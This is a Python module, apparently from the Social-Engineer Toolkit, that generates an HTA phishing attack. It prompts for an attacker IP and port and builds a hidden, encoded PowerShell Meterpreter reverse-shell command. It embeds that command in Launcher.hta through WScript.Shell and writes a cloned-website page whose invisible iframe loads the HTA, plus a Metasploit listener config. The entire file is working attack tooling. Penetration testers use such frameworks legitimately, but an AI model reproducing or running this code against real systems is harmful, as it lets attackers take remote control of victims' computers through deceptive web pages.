#!/usr/bin/env python
######################################################
#
# Main files for the HTA attack vector within SET
#
######################################################
from src.core.setcore import *

def gen_hta_cool_stuff():
    print_status(
        "HTA Attack Vector selected. Enter your IP, Port, and Payload...")
    ipaddr = input(
        "Enter the IP address for the reverse payload (LHOST): ")
    update_options("IPADDR=%s" % (ipaddr))
    port = input("Enter the port for the reverse payload [443]: ")
    if port == "":
        port = "443"
    print("""Select the payload you want to deliver:\n\n  1. Meterpreter Reverse HTTPS\n  2. Meterpreter Reverse HTTP\n  3. Meterpreter Reverse TCP\n""")
    selection = input("Enter the payload number [1-3]: ")

    # define the payloads
    if selection == "":
        selection = "1"
    if selection == "1":
        selection = "windows/meterpreter/reverse_https"
    if selection == "2":
        selection = "windows/meterpreter/reverse_http"
    if selection == "3":
        selection = "windows/meterpreter/reverse_tcp"

    # generate powershell code
    print_status(
        "Generating powershell injection code and x86 downgrade attack...")
    ps = generate_powershell_alphanumeric_payload(
        selection, ipaddr, port, "x86")
    command = ("powershell -window hidden -EncodedCommand " + ps)
    # hta code here
    print_status("Embedding HTA attack vector and PowerShell injection...")
    # grab cloned website
    url = fetch_template()
    main1 = ("""<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % (command))
    main2 = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)

    # metasploit answer file here
    filewrite = open(setdir + "/meta_config", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (selection, ipaddr, port))
    filewrite.close()

    #  write out main1 and main2
    filewrite = open(setdir + "/hta_index", "w")
    filewrite.write(main2)
    filewrite.close()

    # write out launcher.hta
    filewrite = open(setdir + "/Launcher.hta", "w")
    filewrite.write(main1)
    filewrite.close()
